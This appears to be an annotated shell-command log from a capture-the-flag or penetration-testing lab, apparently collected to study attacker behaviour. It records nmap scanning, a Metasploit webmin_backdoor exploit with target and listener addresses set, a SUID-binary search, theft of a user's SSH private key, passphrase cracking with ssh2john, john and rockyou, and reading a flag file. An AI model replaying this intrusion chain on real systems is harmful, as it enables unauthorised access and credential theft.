User 56 start time 1594797664 end 1594805186
PADDING
PADDING
PADDING
INPUT|56--0|A0 A1 |1594797664|56|nmap 172.18.1.15|OUTPUT
INPUT|56--129|A10 |1594802076|56|ls|OUTPUT
INPUT|56--130|A10 |1594802083|56|ls|OUTPUT
INPUT|56--131|A11 A12 A17 |1594802128|56|cat miniserv.log|OUTPUT
INPUT|56--132|A10 |1594802221|56|ls|OUTPUT
INPUT|56--133|U|1594802227|56|nmap|OUTPUT
INPUT|56--134|A10 |1594802232|56|ls|OUTPUT
INPUT|56--135|U|1594802233|56|cd ..|OUTPUT
INPUT|56--136|A10 |1594802233|56|ls|OUTPUT
INPUT|56--137|U|1594802237|56|cd backusp|OUTPUT
INPUT|56--138|A10 |1594802238|56|ls|OUTPUT
INPUT|56--139|U|1594802241|56|cd backups|OUTPUT
INPUT|56--140|A10 |1594802241|56|ls|OUTPUT
INPUT|56--141|A11 A12 A17 |1594802250|56|cat passwd.bak|OUTPUT
INPUT|56--142|U|1594802255|56|clear|OUTPUT
INPUT|56--143|A10 |1594802256|56|ls|OUTPUT
INPUT|56--144|U|1594802257|56|cd ..|OUTPUT
INPUT|56--145|U|1594802258|56|cd ..|OUTPUT
INPUT|56--146|A10 |1594802261|56|ls|OUTPUT
INPUT|56--147|U|1594802229|56|cd /home|OUTPUT
INPUT|56--148|A10 |1594802230|56|ls|OUTPUT
INPUT|56--149|U|1594802455|56|cd /home|OUTPUT
INPUT|56--150|A10 |1594802456|56|ls|OUTPUT
INPUT|56--151|U|1594802459|56|cd alice|OUTPUT
INPUT|56--152|A10 |1594802460|56|ls|OUTPUT
INPUT|56--153|A10 |1594802463|56|ls -la|OUTPUT
INPUT|56--154|A11 A12 A17 |1594802473|56|cat .bash_logout|OUTPUT
INPUT|56--155|U|1594802478|56|cd ..|OUTPUT
INPUT|56--156|A10 |1594802479|56|ls|OUTPUT
INPUT|56--157|U|1594802481|56|cd bob|OUTPUT
INPUT|56--158|A10 |1594802482|56|ls|OUTPUT
INPUT|56--159|A10 |1594802485|56|ls -la|OUTPUT
INPUT|56--160|A11 A12 A17 |1594802492|56|cat .profile|OUTPUT
INPUT|56--161|U|1594802493|56|cd ..|OUTPUT
INPUT|56--162|A10 |1594802494|56|ls|OUTPUT
INPUT|56--163|U|1594802497|56|cd debian|OUTPUT
INPUT|56--164|A10 |1594802499|56|ls -la|OUTPUT
INPUT|56--165|A11 A12 A17 |1594802508|56|cat .bashrc|OUTPUT
INPUT|56--166|A10 |1594802514|56|ls|OUTPUT
INPUT|56--167|A10 |1594802517|56|ls -la|OUTPUT
INPUT|56--168|A11 A12 A17 |1594802526|56|cat .ansible|OUTPUT
INPUT|56--169|U|1594802530|56|cd .ansible|OUTPUT
INPUT|56--170|A10 |1594802532|56|ls|OUTPUT
INPUT|56--171|U|1594802535|56|cd tmp|OUTPUT
INPUT|56--172|A10 |1594802536|56|ls|OUTPUT
INPUT|56--173|A10 |1594802538|56|ls -la|OUTPUT
INPUT|56--174|U|1594802541|56|cd ..|OUTPUT
INPUT|56--175|A10 |1594802543|56|ls -la|OUTPUT
INPUT|56--176|A10 |1594802545|56|ls|OUTPUT
INPUT|56--177|U|1594802549|56|cd ..|OUTPUT
INPUT|56--178|A10 |1594802550|56|ls|OUTPUT
INPUT|56--179|A10 |1594802552|56|ls -la|OUTPUT
INPUT|56--180|A11 A12 A17 |1594802565|56|cat .bash_logout|OUTPUT
INPUT|56--181|A10 |1594802632|56|ls|OUTPUT
INPUT|56--182|U|1594802639|56|msfconsole|OUTPUT
INPUT|56--183|U|1594802691|56|use unix/webapp/webmin_backdoor|OUTPUT
INPUT|56--184|U|1594802695|56|show options|OUTPUT
INPUT|56--185|U|1594802722|56|set RHOSTS 172.18.1.5|OUTPUT
INPUT|56--186|U|1594802783|56|set LHOST 10.1.135.83|OUTPUT
INPUT|56--187|U|1594802796|56|set RPORT 10000|OUTPUT
INPUT|56--188|A11 A12 A17 |1594802570|56|cat .progle|OUTPUT
INPUT|56--189|A10 |1594802897|56|ls|OUTPUT
INPUT|56--190|U|1594802901|56|cd /root/|OUTPUT
INPUT|56--191|U|1594802926|56|export TERM=xterm|OUTPUT
INPUT|56--192|U|1594802928|56|clear|OUTPUT
INPUT|56--193|A10 |1594802930|56|ls|OUTPUT
INPUT|56--194|U|1594802942|56|cd /home|OUTPUT
INPUT|56--195|A10 |1594802942|56|ls|OUTPUT
INPUT|56--196|U|1594802944|56|cd eve|OUTPUT
INPUT|56--197|A10 |1594802945|56|ls|OUTPUT
INPUT|56--198|A10 |1594802947|56|ls -la|OUTPUT
INPUT|56--199|M11 |1594802956|56|cat .bash_history|OUTPUT
INPUT|56--200|U|1594803094|56|cd /var/www|OUTPUT
INPUT|56--201|A10 |1594803095|56|ls|OUTPUT
INPUT|56--202|U|1594803098|56|cd /var|OUTPUT
INPUT|56--203|A10 |1594803099|56|ls|OUTPUT
INPUT|56--204|U|1594803102|56|cd webmin|OUTPUT
INPUT|56--205|A10 |1594803113|56|ls|OUTPUT
INPUT|56--206|A12 A17 |1594803156|56|cat blocked|OUTPUT
INPUT|56--207|U|1594803161|56|cd blocked|OUTPUT
INPUT|56--208|U|1594803166|56|cd ..|OUTPUT
INPUT|56--209|A10 |1594803167|56|ls|OUTPUT
INPUT|56--210|U|1594803168|56|cd local|OUTPUT
INPUT|56--211|A10 |1594803170|56|ls|OUTPUT
INPUT|56--212|U|1594803172|56|cd ..|OUTPUT
INPUT|56--213|A10 |1594803190|56|ls|OUTPUT
INPUT|56--214|U|1594803329|56|scp 10.1.17.4|OUTPUT
INPUT|56--215|A10 |1594803383|56|ls|OUTPUT
INPUT|56--216|A16 |1594803417|56|ssh 10.1.17.4|OUTPUT
INPUT|56--217|A10 |1594803472|56|ls|OUTPUT
INPUT|56--218|U|1594803478|56|cd backups|OUTPUT
INPUT|56--219|A10 |1594803479|56|ls|OUTPUT
INPUT|56--220|A12 A17 |1594803484|56|cat passwd.bak|OUTPUT
INPUT|56--221|A10 |1594803493|56|ls|OUTPUT
INPUT|56--222|U|1594803497|56|cd ..|OUTPUT
INPUT|56--223|U|1594803497|56|l|OUTPUT
INPUT|56--224|A10 |1594803499|56|sls|OUTPUT
INPUT|56--225|A10 |1594803502|56|ls|OUTPUT
INPUT|56--226|U|1594803506|56|cd local|OUTPUT
INPUT|56--227|A10 |1594803508|56|ls|OUTPUT
INPUT|56--228|U|1594803514|56|cd ..|OUTPUT
INPUT|56--229|U|1594803517|56|cd log|OUTPUT
INPUT|56--230|A10 |1594803517|56|ls|OUTPUT
INPUT|56--231|A12 A17 |1594803528|56|cat user.log|OUTPUT
INPUT|56--232|A10 |1594803543|56|ls|OUTPUT
INPUT|56--233|U|1594803546|56|cd ..|OUTPUT
INPUT|56--234|U|1594803546|56|l|OUTPUT
INPUT|56--235|A10 |1594803553|56|ls|OUTPUT
INPUT|56--236|U|1594803567|56|cd lock|OUTPUT
INPUT|56--237|U|1594803568|56|l|OUTPUT
INPUT|56--238|A10 |1594803569|56|sls|OUTPUT
INPUT|56--239|U|1594803571|56|cd ..|OUTPUT
INPUT|56--240|A10 |1594803573|56|ls|OUTPUT
INPUT|56--241|U|1594803579|56|cd mail|OUTPUT
INPUT|56--242|A10 |1594803580|56|ls|OUTPUT
INPUT|56--243|U|1594803582|56|cd ..|OUTPUT
INPUT|56--244|A10 |1594803642|56|find / -perm -4000 2>/dev/null|OUTPUT
INPUT|56--245|A10 |1594803652|56|ls|OUTPUT
INPUT|56--246|U|1594803660|56|cd webmin|OUTPUT
INPUT|56--247|A10 |1594803661|56|ls|OUTPUT
INPUT|56--248|U|1594803670|56|cd ..|OUTPUT
INPUT|56--249|A10 |1594803671|56|ls|OUTPUT
INPUT|56--250|U|1594803677|56|ifconfig|OUTPUT
INPUT|56--251|A10 |1594803790|56|ls|OUTPUT
INPUT|56--252|A10 |1594803864|56|ls|OUTPUT
INPUT|56--253|A10 |1594803865|56|ls|OUTPUT
INPUT|56--254|U|1594803917|56|cd /home|OUTPUT
INPUT|56--255|A10 |1594803918|56|ls|OUTPUT
INPUT|56--256|U|1594803920|56|cd eve|OUTPUT
INPUT|56--257|A16 |1594803923|56|cd .ssh|OUTPUT
INPUT|56--258|A10 |1594803923|56|ls|OUTPUT
INPUT|56--259|U|1594803933|56|exploit|OUTPUT
INPUT|56--260|M16 |1594803970|56|ssh -i id_rsa -l eve 10.1.17.4|OUTPUT
INPUT|56--261|U|1594804029|56|cd /home/eve|OUTPUT
INPUT|56--262|A10 |1594804030|56|ls|OUTPUT
INPUT|56--263|U|1594804032|56|cd .ssh|OUTPUT
INPUT|56--264|U|1594804032|56|l|OUTPUT
INPUT|56--265|A10 |1594804035|56|ls|OUTPUT
INPUT|56--266|U|1594804070|56|ssh -i id_rsa eve@10.1.17.4|OUTPUT
INPUT|56--267|M12 |1594804116|56|cat id_rsa|OUTPUT
INPUT|56--268|A14 |1594804162|56|ssh2john|OUTPUT
INPUT|56--269|A17 |1594804301|56|cat id_rsa|OUTPUT
INPUT|56--270|U|1594804293|56|touch id_rsa|OUTPUT
INPUT|56--271|U|1594804296|56|nano id_rsa|OUTPUT
INPUT|56--272|U|1594804312|56|nano id_rsa|OUTPUT
INPUT|56--273|A10 |1594804339|56|ls|OUTPUT
INPUT|56--274|A14 |1594804346|56|ss2john.py id_rsa|OUTPUT
INPUT|56--275|M13 |1594804364|56|python ssh2john.py id_rsa|OUTPUT
INPUT|56--276|A14 |1594804372|56|python ssh2john.py id_rsa > hash|OUTPUT
INPUT|56--277|A14 |1594804379|56|john hash|OUTPUT
INPUT|56--278|A10 |1594804552|56|ls|OUTPUT
INPUT|56--279|A10 |1594804625|56|ls|OUTPUT
INPUT|56--280|A17 |1594804633|56|cat id_rsa|OUTPUT
INPUT|56--281|A14 |1594804663|56|john hash|OUTPUT
INPUT|56--282|U|1594804925|56|cd /usr/share/|OUTPUT
INPUT|56--283|A10 |1594804926|56|ls|OUTPUT
INPUT|56--284|U|1594804935|56|cd wordlists/|OUTPUT
INPUT|56--285|A10 |1594804936|56|ls|OUTPUT
INPUT|56--286|M14 |1594804975|56|john /root/hash --wordlist=rockyou.txt|OUTPUT
INPUT|56--287|U|1594805126|56|ssh -i id_rsa eve@10.1.17.4|OUTPUT
INPUT|56--288|A10 |1594805141|56|ls|OUTPUT
INPUT|56--289|A17 |1594805177|56|cat top-secret|OUTPUT
INPUT|56--290|U|1594805183|56|cd top-secret|OUTPUT
INPUT|56--291|A10 |1594805184|56|ls|OUTPUT
INPUT|56--292|M17 |1594805186|56|cat flag.txt|OUTPUT
